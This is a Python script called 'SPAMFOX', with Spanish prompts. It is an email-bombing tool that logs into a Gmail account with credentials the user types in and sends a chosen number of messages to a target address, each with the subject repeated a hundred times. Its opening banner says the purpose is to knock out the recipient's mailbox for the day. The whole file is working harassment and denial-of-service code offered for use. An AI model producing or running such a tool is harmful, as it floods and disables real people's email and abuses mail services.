 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import random
import smtplib
print("""

░██████╗██████╗░░█████╗░███╗░░░███╗███████╗░█████╗░██╗░░██╗
██╔════╝██╔══██╗██╔══██╗████╗░████║██╔════╝██╔══██╗╚██╗██╔╝
╚█████╗░██████╔╝███████║██╔████╔██║█████╗░░██║░░██║░╚███╔╝░
░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║██╔══╝░░██║░░██║░██╔██╗░
██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║██║░░░░░╚█████╔╝██╔╝╚██╗
╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░░╚════╝░╚═╝░░╚═╝""")
print("""Recuerda colocar un correo que tenga activa la opcion
de fuentes de envio descoonocidas para lograr enviar el mensaje, este tiene que ser tuyo
el limite de envio es de 500 mensaje a recibir por dia y por enviar, 
haci que inavilitaras el correo de la persona por ese dia, D1V13RT3T3""")

rt = str(input("encabezado: ")) * 100
tr = str(input("password: "))
From = str(input("de: "))
to = str(input("para: "))
mes = str(input("que deseas enviarles ala persona: "))


def run():
# create message object instance

	msg = MIMEMultipart()
	 

	message = mes
	 
	# setup the parameters of the message
	password = tr
	msg['From'] = From
	msg['To'] = to
	msg['Subject'] = rt
	 
	# add in the message body
	msg.attach(MIMEText(message, 'plain'))
	 
	#create server
	server = smtplib.SMTP('smtp.gmail.com: 587')
	 
	server.starttls()
	 
	# Login Credentials for sending the mail
	server.login(msg['From'], password)
	 
	 
	# send the message via the server.
	server.sendmail(msg['From'], msg['To'], msg.as_string())
	 
	server.quit()
	 
	print("successfully sent email:")


def inicio():
	print("spam fox")
	"""variables that will determine the number of messages"""
	a = int(input("cuantos emails deseas enviar?: "))
	i = 0
	"""the while determines the number of messages 
			that must be sent through the previous variable"""


	while i > a or i < a:
		run()
		i+= 1
	print("Spam Finalisado")

	B = str(input("desea volver a ejecutar el script: "))
	if B == "si":
		inicio()
	else:
		print("Finished")
		quit()


if __name__ == "__main__":
	inicio()

